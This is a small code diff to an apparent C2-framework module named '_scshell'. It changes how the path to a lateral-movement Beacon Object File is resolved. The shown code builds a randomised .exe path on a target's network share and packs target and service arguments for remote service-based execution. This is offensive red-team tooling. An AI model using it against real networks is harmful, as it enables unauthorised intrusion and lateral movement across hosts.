@@ -1,6 +1,8 @@
-import conquest 
-import os.path 
+import conquest
+import os.path
 import random
+
+SCRIPT_DIR = os.path.dirname(__file__)
 
 def _scshell(agentId, cmdline, args): 
     target = conquest.get_string(args, 0)
@@ -13,7 +15,7 @@ def _scshell(agentId, cmdline, args):
     path = f"\\\\{target}\\{share}\\{name if name else ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=8))}"
     if not path.endswith(".exe"): path += ".exe"
 
-    bof = conquest.modules_root() + "/lateral-movement/scshell/scshell.x64.o"
+    bof = os.path.join(SCRIPT_DIR, "scshell/scshell.x64.o")
     params = conquest.bof_pack("zzzb", [
         target,         # z: Target system
         service,        # z: Target service
